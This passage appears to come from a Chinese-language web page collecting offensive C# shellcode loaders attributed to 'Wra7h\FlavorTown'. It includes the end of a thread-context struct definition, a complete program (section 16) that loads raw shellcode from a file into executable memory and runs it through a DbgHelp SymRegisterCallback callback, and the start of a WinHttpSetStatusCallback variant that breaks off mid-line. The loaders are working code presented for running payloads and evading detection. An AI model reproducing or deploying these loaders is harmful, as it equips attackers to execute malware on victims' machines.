hljs-number">217</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rcx;<br><span class="linenum hljs-number">218</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rdx;<br><span class="linenum hljs-number">219</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rbx;<br><span class="linenum hljs-number">220</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rsp;<br><span class="linenum hljs-number">221</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rbp;<br><span class="linenum hljs-number">222</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rsi;<br><span class="linenum hljs-number">223</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rdi;<br><span class="linenum hljs-number">224</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R8;<br><span class="linenum hljs-number">225</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R9;<br><span class="linenum hljs-number">226</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R10;<br><span class="linenum hljs-number">227</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R11;<br><span class="linenum hljs-number">228</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R12;<br><span class="linenum hljs-number">229</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R13;<br><span class="linenum hljs-number">230</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R14;<br><span class="linenum hljs-number">231</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;R15;<br><span class="linenum hljs-number">232</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;Rip;<br><span class="linenum hljs-number">233</span><br><span class="linenum hljs-number">234</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;XSAVE_FORMAT64&nbsp;DUMMYUNIONNAME;<br><span class="linenum hljs-number">235</span><br><span class="linenum hljs-number">236</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">MarshalAs(UnmanagedType.ByValArray,&nbsp;SizeConst&nbsp;=&nbsp;26)</span>]<br><span class="linenum hljs-number">237</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;M128A[]&nbsp;VectorRegister;<br><span class="linenum hljs-number">238</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;VectorControl;<br><span class="linenum hljs-number">239</span><br><span class="linenum hljs-number">240</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;DebugControl;<br><span class="linenum hljs-number">241</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;LastBranchToRip;<br><span class="linenum hljs-number">242</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;LastBranchFromRip;<br><span class="linenum hljs-number">243</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;LastExceptionToRip;<br><span class="linenum hljs-number">244</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">ulong</span>&nbsp;LastExceptionFromRip;<br><span class="linenum hljs-number">245</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">246</span><br><span class="linenum hljs-number">247</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">struct</span>&nbsp;STACKFRAME<br><span class="linenum hljs-number">248</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">249</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;AddrPC;<br><span class="linenum hljs-number">250</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;AddrReturn;<br><span class="linenum hljs-number">251</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;AddrFrame;<br><span class="linenum hljs-number">252</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;AddrStack;<br><span class="linenum hljs-number">253</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;FuncTableEntry;<br><span class="linenum hljs-number">254</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Params;<br><span class="linenum hljs-number">255</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;Far;<br><span class="linenum hljs-number">256</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;Virtual;<br><span class="linenum hljs-number">257</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;Reserved;<br><span class="linenum hljs-number">258</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;KDHELP64;<br><span class="linenum hljs-number">259</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">public</span>&nbsp;IntPtr&nbsp;AddrBStore;<br><span class="linenum hljs-number">260</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">261</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">262</span>}<br></code></pre>
<h1 id="h16csymregistercallback"><span>16.回调函数注入 (C#) 通过 SymRegisterCallback</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">SymRegisterCallback</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"Example&nbsp;Usage:&nbsp;SymRegisterCallback.exe&nbsp;C:\\Path\\To\\Raw\\Shellcode.bin\n"</span>);<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.Environment.Exit(<span class="hljs-number">1</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">byte</span>[]&nbsp;payload&nbsp;=&nbsp;System.IO.File.ReadAllBytes(args[<span class="hljs-number">0</span>]);<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr.Zero,<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(<span class="hljs-keyword">uint</span>)payload.Length,<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x1000</span>&nbsp;<span class="hljs-comment">/*COMMIT*/</span>,<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x40</span>&nbsp;<span class="hljs-comment">/*RWX*/</span>);<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Marshal.Copy(payload,&nbsp;<span class="hljs-number">0</span>,&nbsp;hAlloc,&nbsp;payload.Length);<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;oldProtect;<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtectEx(<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Process.GetCurrentProcess().Handle,<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hAlloc,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload.Length,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-number">0x20</span>,&nbsp;<span class="hljs-comment">//RX</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;oldProtect);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess&nbsp;=&nbsp;Process.GetCurrentProcess().Handle;<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SymInitialize(hProcess,&nbsp;String.Empty,&nbsp;<span class="hljs-literal">false</span>);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SymRegisterCallback(hProcess,&nbsp;hAlloc,&nbsp;IntPtr.Zero);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SymRefreshModuleList(hProcess);<br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32"</span>)</span>]<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;IntPtr&nbsp;<span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params"><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;dwSize,<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flAllocationType,<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flProtect</span>)</span>;<br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"kernel32.dll"</span>)</span>]<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params"><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;lpAddress,<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">int</span>&nbsp;dwSize,<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">uint</span>&nbsp;flNewProtect,<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">out</span>&nbsp;<span class="hljs-keyword">uint</span>&nbsp;lpflOldProtect</span>)</span>;<br><span class="linenum hljs-number">59</span><br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"DbgHelp.dll"</span>)</span>]<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">SymInitialize</span>(<span class="hljs-params"><br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">string</span>&nbsp;UserSearchPath,<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">bool</span>&nbsp;fInvadeProcess</span>)</span>;<br><span class="linenum hljs-number">65</span><br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"DbgHelp.dll"</span>)</span>]<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">SymRegisterCallback</span>(<span class="hljs-params"><br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hProcess,<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;hCallback,<br><span class="linenum hljs-number">70</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntPtr&nbsp;UserContext</span>)</span>;<br><span class="linenum hljs-number">71</span><br><span class="linenum hljs-number">72</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">"DbgHelp.dll"</span>)</span>]<br><span class="linenum hljs-number">73</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">extern</span>&nbsp;<span class="hljs-keyword">bool</span>&nbsp;<span class="hljs-title">SymRefreshModuleList</span>(<span class="hljs-params">IntPtr&nbsp;hProcess</span>)</span>;<br><span class="linenum hljs-number">74</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">75</span>}<br></code></pre>
<h1 id="h17cwinhttpsetstatuscallback"><span>17.回调函数注入 (C#) 通过 WinHttpSetStatusCallback</span></h1>
<pre><code class="hljs cs"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h\FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Compile:&nbsp;Visual&nbsp;Studio&nbsp;2022&nbsp;&amp;&nbsp;.NET&nbsp;Fx&nbsp;3.5+</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-keyword">using</span>&nbsp;System;<br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">using</span>&nbsp;System.Diagnostics;<br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">using</span>&nbsp;System.Runtime.InteropServices;<br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">namespace</span>&nbsp;<span class="hljs-title">WinHttpSetStatusCallback</span><br><span class="linenum hljs-number"> 9</span>{<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">internal</span>&nbsp;<span class="hljs-keyword">class</span>&nbsp;<span class="hljs-title">Program</span><br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-function"><span class="hljs-keyword">static</span>&nbsp;<span class="hljs-keyword">void</span>&nbsp;<span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[]&nbsp;args</span>)<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(args.Length&nbsp;&lt;&nbsp;<span class="hljs-number">1</span>)<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span class="hljs-string">"\nNo&nbsp;shellcode&nbsp;specified."</span>);<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Console.WriteLine(<span 